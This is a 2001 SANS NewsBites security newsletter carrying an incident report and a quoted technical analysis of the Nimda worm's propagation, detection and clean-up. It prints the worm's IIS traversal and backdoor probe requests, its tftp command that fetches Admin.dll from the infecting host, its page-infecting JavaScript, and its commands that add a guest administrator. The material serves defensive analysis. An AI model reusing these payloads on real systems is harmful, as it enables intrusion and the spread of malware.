@@ -1,0 +1,572 @@
+The NIMDA worm is spreading faster than Code Red, appears to have at
+least four distinct propagation mechanisms, and infects hosts running
+most versions of Windows. In other words it is a far more vicious worm
+than Code Red. The network activity caused by the worm has resulted
+in effective denial of service attacks at many sites. I've included
+this morning's complete report from Incidents.org at the end of this
+Newsbites issue. Updates to the report can be found at
+http://www.incidents.org/react/nimda.php
+
+                                 AP
+
+Nimda Worm
+Version 0.2 - September 19, 2001
+NIMDA Worm/Virus Report -- Preliminary
+
+Last Update: September 19, 2001 6:00 AM CDT
+SUMMARY: A new worm that has been named "Nimda" is propagating with
+unprecedented speed across the Internet. The worm appears to have at
+least four distinct propagation mechanisms, and infects hosts running
+any version of Windows. The network activity caused by the worm
+has resulted in an effective denial of service attack at many sites.
+The worm was named NIMDA (admin spelled backwards) in part because the
+name "Concept Virus" conflicts with another virus from a few years ago.
+
+SURGE IN HTTP TRAFFIC: On Sept. 18th incidents.org and its partner
+organization DShield.org received a huge number of reports of increased
+HTTP probing and network slowdowns.  The plots below show the surge
+in both the number of HTTP probes (Figure 1) and the number of unique
+sources generating the probes (Figure 2). Further, the activity jumped
+dramatically at approximately 13:00 GMT and then proceeded to taper off
+in the following hours. Figure 3 shows the number of probes received
+per hour on Sept. 18th, and Figure 4 shows the hourly breakdown for
+number of unique sources generating the activity on the same day.
+
+DISTRIBUTION OF SCANNING HOSTS: The 86,000+ unique IP addresses
+reported to the Internet Storm Center as sourcing port 80 probes on
+the 18th breaks down by country roughly as follows (only countries
+contributing > 500 sources are shown):
+
+Country	# Ips	% of Total
+USA 	37318 	42.97 %
+China 	7818 	9.00 %
+Korea  6462	7.44 %
+Germany 3681 4.24 %
+Canada	3267	3.76 %
+Great	Britain	2750	3.17 %
+Italy	1874	2.16 %
+Australia	1821	2.10 %
+France	1538	1.77 %
+Japan	1414	1.63 %
+Taiwan	1353	1.56 %
+Brazil	1128	1.30 %
+Spain	1021	1.18 %
+Netherlands	953	1.10 %
+Sweden	914	1.05 %
+Hong Kong	862	0.99 %
+India	853	0.98 %
+Mexico	702	0.81 %
+Thailand	641	0.74 %
+Denmark	630	0.73 %
+Russia	590	0.68 %
+Belgium	582	0.67 %
+Austria	553	0.64 %
+
+OVERVIEW OF WORM PROPAGATION: Preliminary analyses indicate that the
+worm attempts to propagate itself to new victims via four distinct
+mechanisms.
+
+1.	The worm scans the Internet looking for IIS servers and
+attempts to exploit a number of IIS vulnerabilities to gain control
+of a victim host.  Network attacks include exploitation of the "IIS
+Directory Traversal Vulnerability", and utilization of backdoors
+left behind by previous Code Red II and Sadmind infections. Once in
+control of a victim IIS server, the worm uses TFTP to transfer its
+code from the attacking machine to the victim. The file transferred
+via TFTP is named Admin.dll.
+
+2.	The worm harvests email addresses from the Windows address
+book and user's inboxes and sends itself to all addresses as an
+attachment named "readme.exe".	Note that any x86 email software that
+uses Internet Explorer 5.5 SP1 or earlier to display HTML messages
+will automatically execute the malicious attachment if the message is
+merely opened or previewed. This happens because the worm MIME encodes
+the attachment to take advantage of a known vulnerability called
+"Automatic Execution of Embedded MIME Types" (see CERT advisory
+CA-2001-06). Microsoft's Outlook and Outlook Express are the most
+typical victims.
+
+3.	If the worm successfully infects a web server, it uses
+the HTTP service to propagate itself to clients who browse the web
+server's pages. Upon infecting a victim server, the worm creates a
+copy of itself named "readme.eml" and traverses the directory tree
+(including network shares) searching for web-related files such as
+those with .html, .htm, or .asp extensions. Each time the worm finds
+a web content file, it appends a piece of JavaScript to the file.
+The JavaScript forces a download of readme.eml to any client that
+views the file via a browser. Some versions of Internet Explorer
+will automatically execute the readme.eml file and allow the worm
+to infect the client. The IE vulnerability issue here is the same as
+in the email propagation mechanism; that is, IE 5.5 SP1 or earlier is
+vulnerable to the "Automatic Execution of Embedded MIME Types" problem.
+Allowing JavaScript in the browser enables the attack to take advantage
+of the vulnerability.
+
+4.	The worm is network aware and propagates via open file
+shares. It will copy itself to all directories, including those found
+on a network share, for which the user has write permission. These
+worm copies are named "readme.eml". Any other host that accesses the
+share and executes or previews one of these files can become infected.
+
+TARGETING MECHANISM: The IIS propagation mechanism described
+above requires an infected system to scan the Internet in search of
+vulnerable IIS servers. This worm prefers to target its neighbors in
+IP space and will only attack a completely random target IP with a 25%
+probability. The worm chooses targets having the same first octet
+(only) with 25% probability, and having the same first two octets
+with 50% probability. This behavior can lead to massive amounts of
+network activity at sites having several infected machines.
+
+Note: Some conflicting reports indicate that the worm first targets
+IPs with the same first three octets, then moves to IPs with the
+same first two octets, and then out a level further to IPs with the
+same first octet. The exact target selection pattern is still under
+investigation, but it is clear that the worm prefers to target locally
+rather than randomly.
+
+DETAILS OF IIS PROPAGATION: A short example of the IIS probes launched
+by the worm is shown below. These logs were captured by an Apache web
+server. Note that the pattern repeats itself; some reports indicate
+that the 16-probe sequence will be repeated against a single target
+as many as 13 times. Note that the first two attacks show the worm
+attempting to exploit the root.exe backdoor left by Code Red II or
+possibly Sadmind infections. The next set of two attacks are also
+targeting Code Red II backdoors where the root C: and D: drives are
+mapped to IIS virtual folders, allowing access to cmd.exe.
+"GET /scripts/root.exe?/c+dir HTTP/1.0" 404 210 "-""-"
+"GET /MSADC/root.exe?/c+dir HTTP/1.0" 404 208 "-""-"
+"GET /c/winnt/system32/cmd.exe?/c+dir HTTP/1.0" 404 218 "-" "-"
+"GET /d/winnt/system32/cmd.exe?/c+dir HTTP/1.0" 404 218 "-" "-"
+"GET /scripts/..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" 404 232
+"-" "-"
+"GET
+/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir
+   HTTP/1.0" 404 249 "-" "-"
+"GET/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+d
+ir
+   HTTP/1.0" 404 249 "-" "-"
+"GET
+/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../
+   winnt/system32/cmd.exe?/c+dir HTTP/1.0" 404 265 "-" "-"
+"GET /scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" 404
+231 "-" "-"
+"GET /scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir HTTP/1.0" 404
+231 "-" "-"
+"GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir HTTP/1.0" 404
+231 "-" "-"
+"GET /scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" 404
+231 "-" "-"
+"GET /scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir HTTP/1.0" 400
+215 "-" "-"
+"GET /scripts/..%%35c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" 400 215
+"-" "-"
+"GET /scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir HTTP/1.0" 404
+232 "-" "-"
+"GET /scripts/..%252f../winnt/system32/cmd.exe?/c+dir HTTP/1.0" 404 232
+"-" "-"
+"GET /scripts/root.exe?/c+dir HTTP/1.0" 404 210 "-" "-"
+"GET /MSADC/root.exe?/c+dir HTTP/1.0" 404 208 "-" "-"
+"GET /c/winnt/system32/cmd.exe?/c+dir HTTP/1.0" 404 218 "-" "-"
+"GET /d/winnt/system32/cmd.exe?/c+dir HTTP/1.0" 404 218 "-" "-"
+"GET /scripts/..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" 404 232
+"-" "-"
+"GET
+/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir
+   HTTP/1.0" 404 249 "-" "-"
+"GET
+/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir
+  HTTP/1.0" 404 249 "-" "-"
+Once the worm gains access to a vulnerable IIS webserver, it uses
+tftp to fetch a binary called Admin.dll from the infecting host. The
+following string is embedded in the worm executable:
+tftp%%20-i%%20%s%%20GET%%20Admin.dll%%20
+An example packet capture of the tftp request is shown below.
+09/18-15:18:23.706570 vulnerable:4184 -> attacker:69 UDP
+TTL:127 TOS:0x0 ID:33619 IpLen:20 DgmLen:46 Len: 26
+00 01 41 64 6D 69 6E 2E 64 6C 6C 00 6F 63 74 65  ..Admin.dll.octe
+74 00                                            t.
+
+DETAILS OF EMAIL PROPAGATION: The worm sends itself to email addresses
+found in the inbox and the address book as an attachment called
+readme.exe.  The attachment is actually encoded as a MIME "multipart-
+alternative" message with two sections. The first section is defined
+as MIME type "text/html", and the second section is defined as MIME
+type "audio/x-wav". The second section actually contains the malicious
+executable file.  The MIME headers for the email message are reproduced
+below. These strings are actually embedded in the worm executable.
+
+- -------------------------------------------
+MIME-Version: 1.0
+Content-Type: multipart/related;
+        type="multipart/alternative";
+        boundary="====_ABC1234567890DEF_===="
+X-Priority: 3
+X-MSMail-Priority: Normal
+X-Unsent: 1
+- --====_ABC1234567890DEF_====
+Content-Type: multipart/alternative;
+        boundary="====_ABC0987654321DEF_===="
+- --====_ABC0987654321DEF_====
+Content-Type: text/html;
+        charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+<HTML><HEAD></HEAD><BODY bgColor=3D#ffffff>
+<iframe src=3Dcid:EA4DMGBP9p height=3D0 width=3D0>
+</iframe></BODY></HTML>
+- --====_ABC0987654321DEF_====--
+- --====_ABC1234567890DEF_====
+Content-Type: audio/x-wav;
+        name="readme.exe"
+Content-Transfer-Encoding: base64
+Content-ID: <EA4DMGBP9p>
+- --====_ABC1234567890DEF_====
+- -----------------------------------------------
+The emails sent by the worm are easily recognizable because very long
+repetitive subject lines are used. An example of one such subject
+line is shown below. Also, the email attachment sent by the worm
+is consistently 57344 bytes long, although MD5 checksums of the
+attachments may vary.
+Subject:
+O•^Rdesktopdesktopsamplesampledesktopsampledesktopsamplesampledesktop
+desktopdesktopdesktopsampledesktopdesktopsampledesktopdesktopdesktop
+sampledesktopdesktopsampledesktopsampledesktopsampledesktopsampl
+Note: Emails carrying the readme.exe attachment have often been
+found with spoofed souce addresses. The addresses appear to have
+been chosen such that they will inspire the recipient to trust the
+email. Spoofed sources observed to date are: piracy@microsoft.com,
+codered@sans.org, webmaster@incidents.org, asportal@microsoft.com,
+and various attrition.org addresses.
+
+DETAILS OF WEB BROWSER-BASED PROPAGATION: A client browsing the web
+pages served by an infected website may become infected. Recall that
+each web-related page is contaminated with a bit of JavaScript code
+during the infection. When the JavaScript is activated by a client's
+browser, the script attempts to download the worm to the client
+in the form of a file named readme.eml". If the client is running
+a vulnerable version of Internet Explorer, the worm code will be
+automatically executed.  The snippet of JavaScript that is appended
+to each web page is:
+<html><script language="JavaScript">window.open("readme.eml", null,
+"resizable=no,top=6000,left=6000")</script></html>
+
+DETAILS OF FILE SHARE ISSUES: In addition to copying itself to all
+directories, including those on shared network drives, the worm
+actively sets up file sharing on the victim. The worm appears to
+make every directory available as a share, and makes the "Guest"
+user an active member of the Administrators group. By default the
+Guest account has no password on Windows systems.  Related strings
+from the worm executable are:
+share c$=c:\
+user guest ""
+localgroup Administrators guest /add
+localgroup Guests guest /add
+user guest /active
+user guest /add
+net%%20use%%20\\%s\ipc$%%20""%%20/user:"guest"
+
+CHANGES TO THE VICTIM FILESYSTEM: The worm infects numerous binaries
+on a victim system, such that any time one of the infected executables
+is run the worm is launched. In addition, the worm positions itself
+in such a way that when document files are opened in editors the worm
+code is executed (see [3]). These characteristics make it incredibly
+difficult to clean the worm from an infected system.
+The worm also makes numerous changes to the victim's registry. Affected
+keys include (these are assumed to be relative to HKLM):
+System\CurrentControlSet\Services\VxD\MSTCP
+SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\
+SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces
+Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
+SYSTEM\CurrentControlSet\Services\lanmanserver\Shares\Security
+Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced
+software\microsoft\windows nt\currentversion\perflib\009
+software\microsoft\windows nt\currentversion\perflib
+SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\
+SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths
+SOFTWARE\Microsoft\Windows\CurrentVersion\Network\LanMan\X$
+SOFTWARE\Microsoft\Windows\CurrentVersion\Network\LanMan\
+SOFTWARE\Microsoft\Windows\CurrentVersion\Network\LanMan
+SYSTEM\CurrentControlSet\Services\lanmanserver\Shares
+Software\Microsoft\Windows\CurrentVersion\Explorer\MapMail
+Regsistry manipulation commands include:
+RegCloseKey
+RegQueryValueExA
+RegOpenKeyExA
+RegEnumKeyExA
+RegCreateKeyExA
+RegDeleteKeyA
+RegEnumValueA
+RegSetValueExA
+RegQueryValueA
+
+RESOURCE CONSUMPTION: The worm appears to launch numerous threads for
+scanning the network which can place considerable load on the infected
+machine as well as the network. Strings in the worm binary indicate
+that the worm may be performing some sort of resource monitoring tasks.
+Relevant strings:
+CreateThread
+SetThreadPriority
+GetCurrentThread
+CreateRemoteThread
+% User Time
+% Privileged Time
+% Processor Time
+
+ISSUES UNDER INVESTIGATION: Some reports indicate that the worm
+may actually cause hardware damage to victim machines.  This claim
+is currently unverified. The worm executable contains a call
+to GetSystemTime. It is currently unknown exactly what the worm
+uses the time for. Some unconfirmed reports indicate that the worm
+includes mechanisms to change its behavior at a later date. However,
+the worm does not appear to carry any sort of DDoS-type payload. Most
+reports on this topic say that the time is used in the generation of
+a random value.
+
+DETECTION:
+Network intrusion detection systems can be configured to trigger on a
+number of network events initiated by the worm. HTTP packets containing
+the string "readme.eml", or TFTP packets containing "Admin.dll" are
+good triggers.  Further, filters can be written to detect the specific
+backdoor and directory traversal attacks targeting IIS servers.
+
+Host-based intrusion detection systems can be configured to notice the
+changes to system executables, and the presence of the "readme.eml"
+files throughout the filesystem. The offending piece of JavaScript
+appended to web content files is another good signature of infection
+on web servers.  Nessus has made a plug-in available for its scanner
+that will remotely test a web server for infection by checking for
+the tell-tale JavaScript addtion to web pages.  Email filters can be
+configured to screen for emails carrying attachments named "readme.exe"
+and having long (80 characters or more) subject lines.
+
+PROTECTION:
+IIS servers should be kept up to date with all current patches. This
+worm takes advantage of vulnerabilities that are eliminated by
+Microsoft's cumulative IIS patch available from:
+
+http://www.microsoft.com/technet/security/bulletin/MS01-020.asp
+
+Note however, that the IIS cumulative patch does not clean out any
+backdoors created by Code Red II or Sadmind infections. Administrators
+should look for the file root.exe and check to see if their C:
+or D: drives have been mapped to IIS virtual folders named "c"
+and "d". This is important since a recent Netcraft survey showed
+that many patched IIS servers still have the root.exe backdoor.
+(See http://www.netcraft.com/survey for August 2001.)  Internet
+Explorer users should be careful to use a version of the browser that
+is secured against the "Automatic Execution of Embedded MIME Types"
+vulnerability. IE 5.01 requires a patch available here:
+http://www.microsoft.com/technet/security/bulletin/MS01-020.asp
+Microsoft recommends upgrading to IE 5.5 SP2 or IE 6.0 to avoid
+problems.
+Disabling JavaScript will prevent the worm code from being executed
+by a browser upon encountering an infected webserver that attempts
+to download readme.eml.
+It is important that the readme.exe file which arrives as an email
+attachment not be executed.
+
+CLEAN-UP: Any system that has been infected with this worm will be
+difficult to clean due to how the worm copies itself all over the
+directory tree and trojans numerous binaries. The recommended response
+is to disconnect the system from the network, reformat the hard drive,
+reinstall the system software, install any necessary security patches,
+and then reconnect the system to the network. No other reliable means
+of cleaning the worm is currently known to exist. However, we expect
+more information in this area will be forthcoming.
+
+ANTI-VIRUS VENDOR INFORMATION:
+Sophos
+http://www.sophos.com/virusinfo/analyses/w32nimdaa.html
+NAI
+http://vil.nai.com/vil/virusSummary.asp?virus_k=99209
+F-Secure
+http://www.f-secure.com/v-descs/nimda.shtml
+Symantec
+http://www.sarc.com/avcenter/venc/data/w32.nimda.a@mm.html
+Data Fellows Corp 
+http://www.datafellows.com/v-descs/nimda.shtml
+McAfee 
+http://vil.mcafee.com/dispVirus.asp?virus_k=99209&
+Trend Micro
+http://www.antivirus.com/vinfo/virusencyclo/default5.asp?VName=TROJ_NIMDA.A
+http://www.antivirus.com/pc-cillin/vinfo/virusencyclo/default5.asp?VName=TROJ_NIMDA.A
+Central Command, Inc.
+http://support.centralcommand.com/cgi-bin/command.cfg/php/enduser/std_adp.php?p_refno=010918-000005
+
+REFERENCES:
+[1] CERT Advisory:
+http://www.cert.org/body/advisories/CA200126_FA200126.html
+
+[2] Numerous emails posted to the intrusions and handlers lists
+at incidents.org, and emails posted to the public mail lists at
+SecurityFocus.
+
+[3] Email messages from the Oregon Infragard List:
+http://lists.jammed.com/crime/2001/09/date.html#end
+
+Specifically, the following message from [3] provides the most
+detail on the worm internals known to date. It is reproduced here
+for reference.
+
+- -----Original Message-----------------------------------------------
+From: victoria.evans@usbank.com
+To: crime@cs.pdx.edu
+Sent: 9/18/01 10:58 PM
+Subject: Very Very good explanation of Concept/Nimda worm propagation
+
+Nimda is a complex mass-mailer, network worm and virus. It is a 57kb
+PE DLL file with an EXE extension.
+
+When run the worm first checks the name of the file it was run from. If
+the name of worm's file is ADMIN.DLL, the worm creates a mutex with
+'fsdhqherwqi2001' name, copies itself as MMC.EXE into \Windows\
+directory and starts this file with '-qusery9bnow' command line. If
+the worm is started from README.EXE file (or a file that has more
+than 5 symbols in its name and EXE extension) the worm copies itself
+to temporary folder with a random name and runs itself there with
+'-dontrunold' command line option.
+
+If the worm is run for the first time (as README.EXE) it loads itself
+as a library, looks for some resource there and checks its size. If
+the resource size is less than 100, the worm unloads itself, otherwise
+the worm checks if it was launched from a hard drive and deletes its
+file in case it was launched from other type of media. If the worm's
+file that is delete is locked, the worm creates WININIT.INI file that
+will delete the worm's file on next Windows startup. If the worm was
+launched from a hard drive, it checks one of its resources, extracts
+it to a file and launches it.  Checking the resource size is done to
+be able to detect if a worm runs from and infected EXE file. In this
+case the original executable part is extracted and run by the worm
+to disguise its presence.
+
+Then the worm gets current time and generates a random number. After
+performing multiplication and division with this number the worm
+checks the result. If a result is bigger than worm's counter, the
+worm starts to search and delete README*.EXE files in temporary folder.
+
+The worm tries to create the
+[SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces]
+key in the Registry. It also queries 'NameServer' value from
+[System\CurrentControlSet\Services\VxD\MSTCP] key. After that the
+worm updates its resources and deletes and re-creates its file. If
+the file is locked, the worm creates WININIT.INI file that will delete
+the previously locked file on next Windows startup.
+
+After that the worm prepares its MIME-encoded copy by extracting a
+pre-defined multi-partite message from its body and appending its
+MIME-encoded copy to it. The file with a random name is created in
+temporary folder.
+
+The worm looks for EXPLORER process, opens it and assigns its
+process as remote thread of Explorer. Then the worm gets API creates
+a mutex with 'fsdhqherwqi2001' name, startups Winsock services,
+gets an infected computer (host) info and sleeps for some time. When
+resumed, the worm checks what platform it is running. If it is running
+on NT-based system, it compacts its memory blocks to occupy less
+space in memory and copies itself as LOAD32.EXE to Windows system
+directory. Then it modifies SYSTEM.INI file by adding the following
+string after SHELL= variable in [Boot] section:
+
+ explorer.exe load.exe -dontrunold
+
+This will start the worm's copy every time Windows starts. The worm
+also copies itself as RICHED32.DLL file to system folder and sets
+hidden and system attributes to this file as well as to LOAD.EXE
+file. Then the worm enumerates shared network resources and scarts
+to recursively scan files on remote systems. If the worm finds an EXE
+file on a remote system, it reads the file, deletes it and then writes
+a new file where the worm body is placed first and the original EXE
+file is present as a resource. Later when this affected file will be
+run, the worm will extract the EXE file resource and run it. The worm
+checks the file name for 'WinZip32.exe' and doesn't affect this file
+if it is found.
+
+When searching for files in remote systems the worm collects names
+of DOC files and then copies its file to folders where DOC files are
+located with RICHED32.DLL name. The copied file has system and hidden
+attributes.  This is done to increase the chances of worm activation
+on remote systems as Windows' original RICHED32.DLL component is used
+to open OLE files. But instead the worm's RICHED32.DLL file will be
+launched as Windows first checks current directory for needed DLLs.
+
+Also when the worm browsing the remote computers' directories it
+creates .EML and .NWS (rarely) files that have the names of document
+files that the worm could find on a remote system. These .EML and .NWS
+files are worm's multi-partite messages with a worm MIME-encoded in
+them. When scanning the worm can also delete the .EML and .NWS files
+it previously created.
+
+The worm adjusts the properties of Windows Explorer, it accesses
+[Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced] key
+and adjusts 'Hidden', 'ShowSuperHidden' and 'HideFileExt' keys. This
+affects Windows' (especially ME and 2000) ability to show hidden
+files - worm's files will not be seen in Explorer any more.
+
+After that the worm adds a 'guest'account to infected
+system account list, activates this account, adds it to
+'Administrator' and 'Guests' groups and shares C:\ drive with
+full access priviledges. The worm also deletes all subkeys from
+[SYSTEM\CurrentControlSet\Services\lanmanserver\Shares\Security]
+key to disable sharing security.
+
+The worm accesses[SOFTWARE\Microsoft\Windows\CurrentVersion\App
+Paths] key reads subkeys from there and affects all files
+listed in the subkeys the same way it does affect remote EXE
+files (see above). The worm doesn't only infect WinZip32.exe
+file. Also the worm reads user's personal folders from
+[Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders]
+key and infects files in these folders as well.
+
+Finally the worm starts to search local hard drives for HTML, .ASP,
+and .HTM files and also for files with 'DEFAULT', 'INDEX', 'MAIN'
+and 'README' words in their filenames and if such files are found,
+the worm creates README.EML file (which is the multi-partite message
+with MIME-encoded worm) in the same directory and adds a small
+JavaScript code to the end of found files. That JavaScript code
+would open README.EML file when the infected HTML file is loaded by
+a web browser. As a result the MIME-encoded worm will get activated
+because of asecurity hole and a system will get infected. It should be
+noted that the worm will not always do the above described operation,
+it depends on a random number the worm generates prior to this action.
+
+The worm's file runs from a minimized window when downloaded from
+an infected webserver. This technique affects users who are browsing
+the web with Internet Explorer 5.0 or 5.01.
+
+ E-Mail spreading:
+
+The worm searches trough all the '.htm' and '.html' file in the
+Temporary Internet Files folder for e-mail addresses. It reads through
+user's inbox and collects the sender addresses. When the address list
+is ready it uses it's own SMTP engine to send the infected messages.
+
+ IIS spreading:
+
+The worm uses backdoors on IIS servers such as the one CodeRed II
+installs. It scans random IP addresses for these backdoors. When a
+host is found to have one, the worm instructs the machine to download
+the worm code (Admin.dll) from the host used for scanning. After this
+it executes the worm on the target machine this way infecting it.
+
+The worm has a copyright text string that is never displayed:
+
+Concept Virus(CV) V.5, Copyright(C)2001 R.P.China
+
+
+It should be said that the worm has bugs that cause crashes or
+inability to spread itself in certain conditions.
+
+
+
+==end==
+
+Please feel free to share this with interested parties via email (not
+on bulletin boards).  For a free subscription, (and for free posters)
+e-mail sans@sans.org with the subject: Subscribe NewsBites
+
+To change your subscription, address, or other information, visit
+http://www.sans.org/sansurl and enter your SD number (from the
+headers.) You will receive your personal URL via email.
+
+You may also email <sans@sans.org> with complete instructions and
+your SD number for subscribe, unsubscribe, change address, add other
+digests, or any other comments.
